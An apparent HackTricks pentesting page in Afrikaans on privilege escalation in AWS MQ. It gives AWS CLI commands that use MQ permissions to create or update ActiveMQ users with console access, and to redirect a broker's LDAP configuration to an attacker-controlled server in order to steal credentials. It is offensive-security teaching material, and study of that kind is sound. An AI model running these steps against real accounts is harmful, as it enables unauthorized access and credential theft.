# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Vir meer inligting oor MQ, kyk:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Met daardie toestemmings kan jy **'n nuwe gebruiker in 'n ActimeMQ broker skep** (dit werk nie in RabbitMQ nie):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potensiële impak:** Toegang tot sensitiewe inligting deur in ActiveMQ te navigeer

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Met daardie toestemmings kan jy **'n nuwe gebruiker in 'n ActimeMQ broker skep** (dit werk nie in RabbitMQ nie):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potensiële impak:** Toegang tot sensitiewe inligting deur ActiveMQ te navigeer

### `mq:ListBrokers`, `mq:UpdateBroker`

As 'n broker **LDAP** gebruik vir outorisering met **ActiveMQ**. Dit is moontlik om die **konfigurasie** van die LDAP-server te **verander** na een wat deur die aanvaller beheer word. Op hierdie manier sal die aanvaller in staat wees om **alle credentials wat via LDAP gestuur word te steel**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Indien jy op een of ander manier die oorspronklike credentials wat deur ActiveMQ gebruik is kon vind, kan jy 'n MitM uitvoer, die creds steel, dit op die oorspronklike bediener gebruik en die respons stuur (miskien deur net die gesteelde creds te hergebruik kan jy dit doen).

**Potensiële impak:** Steel ActiveMQ credentials

{{#include ../../../../banners/hacktricks-training.md}}
